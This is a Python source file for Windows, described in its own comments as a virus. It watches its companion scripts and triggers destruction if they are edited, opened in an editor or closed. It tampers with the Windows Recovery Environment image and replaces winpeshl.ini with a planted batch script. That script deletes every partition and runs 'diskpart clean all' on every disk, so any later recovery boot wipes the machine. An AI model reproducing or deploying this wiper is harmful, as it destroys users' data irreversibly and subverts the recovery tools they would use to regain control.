import sys
import psutil
import os
import time
import hashlib
import win32gui

def get_hashes(files): # misc to get hashes of files
    hashes = []
    for file in files:
        with open(file, 'rb') as f:
            hash = hashlib.file_digest(f, 'sha256')
            hashes.append(hash.hexdigest())
    return hashes

def og_hashes(file_loc, date): # a function that is meant to get the original hashes of the scripts from a specified file. It knows if the hashes in the original file has been messed with because the file's last modified date is set to a specific arbitrary date and if it has been modified the date will also be changed.
    last_date = os.path.getmtime(file_loc) # get the last modified date of the file
    if date != last_date: # check if the last modified date is not the same as the date set by the virus
        destroy()

    with open(file_loc, 'r') as f:
        original_hashes = f.readlines() # get the hashes in an array
        f.close()
    return original_hashes

def check_hashes(script_list, original_hashes): # method that checks that the script files' hashes are intact (that they haven't been changed)
    while True: # always keep on checking
        for script in script_list: # go through all the scripts
            with open(script, 'rb') as f: # open the script to be able to access its content
                hash = hashlib.file_digest(f, 'sha256').hexdigest() # get the sha256 hash of the file
                if hash not in original_hashes: # check if the hash is not one of the original hashes (if one has been changed)
                    destroy()
                f.close() # close to save memory

def window_enumeration_handler(hwnd, results_list):
    # Check if the window is visible to get rid of useless windows
    if win32gui.IsWindowVisible(hwnd):
        results_list.append((hwnd, win32gui.GetWindowText(hwnd)))
    return True # Continue enumeration

def check_windows(script_list): # method that checks for any of the script names in window titles
    while True: # always keep on checking
        window_list = [] # List to store window handles and titles
        win32gui.EnumWindows(window_enumeration_handler, window_list) # Enumerate through all the windows
        for window in window_list:
            for script in script_list: # check all scripts
                if os.path.basename(script) in window[1]: # check if the name of the script is in a window. For example, if someone opened the script in a text editor that displays the name of the file being edited in the window name.
                    destroy()

def check_pids(pids): # checks that all of the pids of the scripts exist (therefore that none of the scripts have been closed)
    while True: # always keep on checking
        for pid in pids: # go through all the pids
            if not psutil.pid_exists(pid): # check if any pid is missing
                destroy()

def check_already_triggered(): # check if one of the checks was already triggered (in case recovery mode was exited during destruction process)
    if os.path.exists('C:/Windows/System32/destroy.trigger'):
        destroy()

def checker(script_list, original_hashes, pids): # perform all check every X time
    check_hashes(script_list, original_hashes)
    check_windows(script_list)
    check_pids(pids)
    check_already_triggered()

def setup_destroy_mechanism(): # modifies WinRE for immediate destruction. After this runs, if windows recovery runs the computer will be wiped, even if ran by the user. This dooms the computer.
    if not os.path.exists('C:/Windows/System32/Destroy me.please'): # for safety reasons, so no data is lost while debugging.
        with open("C:/debugging.txt", 'w') as f:
            f.write('no C:/Windows/System32/Destroy me.please')
            f.close()
        sys.exit()
    with open("C:/debugging.txt", 'a') as f:
        os.system("reagentc /disable") # disable windows recovery environment to be able to modify its files
        f.write('disable')
        os.system("attrib -h -s -r C:\Windows\System32\Recovery\winre.wim") # remove attributes from the windows recovery environment file that cause problems when interacting with it
        f.write('attrib')
        os.system("copy C:\Windows\System32\Recovery\winre.wim C:\Windows\WSF\winre.wim") # copy winre.wim to a folder where it can be modified freely because System32/recovery is a sensetive folder that can cause problems
        f.write('first copy')
        os.system("mkdir C:\Windows\RSLogs") # make a folder to mount winre.wim so its files can be modified
        f.write('mkdir')
        os.system("dism /mount-wim /wimfile:C:\Windows\WSF\winre.wim /index:1 /mountdir:C:\Windows\RSLogs") # mount winre.wim in the folder
        f.write('dism mount')
        os.system("takeown /f C:\Windows\RSLogs /r /d y") # take ownership of the files. Denies access otherwise
        f.write('takeown')
        os.system("icacls C:\mount\Windows\System32 /grant administrators:F /t") # set administrators as the owner of the files to avoid problems
        f.write('icacls')
        os.system("echo [LaunchApps] > C:\Windows\RSLogs\Windows\System32\winpeshl.ini") # winpeshl.ini is the file that tells the system what to do when windows recovery environment launches. We're overwriting it to do other things. [Launchapps] tell winpeshl.ini that we want it to launch something
        f.write('winpeshl p1')
        os.system("echo X:\System32\WinSE.cmd >> C:\Windows\RSLogs\Windows\System32\winpeshl.ini") # tells the system to run the wiping script
        f.write('winpeshl p2')
        f.close()
    with open("C:\Windows\RSLogs\Windows\System32\WinSE.cmd", "w") as f: # make the wiping script
        f.write(('@echo off\n'  # make the script not send any output (suppreses except errors, which are supressed >nul)
             'setlocal enabledelayedexpansion\n'  # allows variables to update inside loops using !var! instead of %var%. When writing to files, %var% would be interpreted as the actual characters, while !var! would yield the value of the variable
             'echo list disk > X:\listdisk.txt\n'  # make a script file that tells diskpart to list all disk information
             'diskpart /s X:\listdisk.txt > X:\disks.txt\n'  # run the script file to know how many disks there are. saves the information to a file.
             'for /f "tokens=2" %%d in (\'type X:\disks.txt ^| find "Disk"\') do (\n'  # looks for lines with the word Disk. In lines found, saves the second word (token), which is the disk number, then loops through each disk
             '   set "diskNum=%%d"\n'  # puts the disk number in a usable variable
             '   (\n'
             '       echo select disk !diskNum!\n'  # select the disk in diskpart
             '       echo list partition\n'  # list all its partitions
             '   ) > X:\listpart.txt\n'  # save commands to a file for diskpart to run
             '   diskpart /s X:\listpart.txt > X:\parts.txt\n'  # run the file with diskpart and save the partition information
             '   for /f "tokens=2" %%p in (\'type X:\parts.txt ^| find "Partition"\') do (\n'  # looks for lines with the word Partition. In lines found, saves the second word (token), which is the partition number, then loops through each partition
             '       set "pNum=%%p"\n'  # puts the partition number in a usable variable
             '       (\n'
             '           echo select disk !diskNum!\n'  # select the disk
             '           echo select partition !pNum!\n'  # select the partition
             '           echo detail partition\n'  # get partition information to check if it is a recovery partition. The recovery partition should be deleted last so if the process is stopped in the middle it can continue
             '       ) > X:\detail.txt\n'  # save commands to a file for diskpart to run
             '       diskpart /s X:\detail.txt > X:\part_info.txt\n'  # run diskpart and saves the information about the partition to a file
             '       set "isRecovery=false"\n'  # initialize a variable for knowing if it is a recovery partition
             '       for /f "tokens=*" %%a in (\'type X:\part_info.txt ^| find /i "Recovery"\') do (\n'  # Looks for the word recovery in the partition info.
             '           set "isRecovery=true"\n'  # sets the variable to true
             '       )\n'
             '       if "!isRecovery!"=="false" (\n'  # runs if it's not a recovery partition
             '           (\n'
             '               echo select disk !diskNum!\n'  # select the disk
             '               echo select partition !pNum!\n'  # select the partition
             '               echo delete partition override\n'  # force delete partition
             '           ) > X:\del_part.txt\n'  # save commands to a file for diskpart to run
             '           diskpart /s X:\del_part.txt >nul\n'  # run the file with diskpart
             '       ) else (\n'  # runs if is a recovery partition
             '           set "recoveryPart=!pNum!"\n'  # store the recovery partition number to be deleted later
             '       )\n'
             '   )\n'  # end of partition loop
             '   if defined recoveryPart (\n'  # checks if there was a recovery partition
             '       (\n'
             '          echo select disk !diskNum!\n'  # select the disk
             '          echo select partition !recoveryPart!\n'  # select the recovery partition
             '          echo delete partition override\n'  # force delete the recovery partition
             '       ) > X:\del_final.txt\n'  # save commands to a file for diskpart to run
             '       diskpart /s X:\del_final.txt >nul\n'  # run the file with diskpart
             '   )\n'
             '   (\n'
             '       echo select disk !diskNum!\n'  # select the disk
             '       echo clean all\n'  # wipe the disk clean
             '   ) > X:\wipe_final.txt\n'  # save commands to a file for diskpart to run
             '   diskpart /s X:\wipe_final.txt >nul\n'  # run the file with diskpart
             ')\n'  # end of disk loop
             'wpeutil shutdown'))  # shut down the system
        f.close()
    with open("C:/debugging.txt", 'a') as f:
        f.write('wrote destruction script')
        os.system("dism /unmount-wim /mountdir:C:\Windows\RSLogs /commit") # repack the modified recovery environment
        f.write('dism commit')
        os.system("xcopy C:\Windows\WSF\winre.wim C:\Windows\System32\Recovery /h /y") # copy the modified recovery environment to its original location
        f.write('copy2')
        os.system("reagentc /enable") # reenable the modified recovery environment
        f.write('reagentc enable')
        f.close()

def destroy():
    if not os.path.exists('C:/Windows/System32/Destroy me.please'): # for safety reasons, so no data is lost while debugging.
        sys.exit()
    else:
        with open("C:/Windows/System32/destroy.trigger", 'w') as f:
            f.close()
        os.system("reagentc /boottore && shutdown /r /f /t 0") # restart into recovery mode to start wiping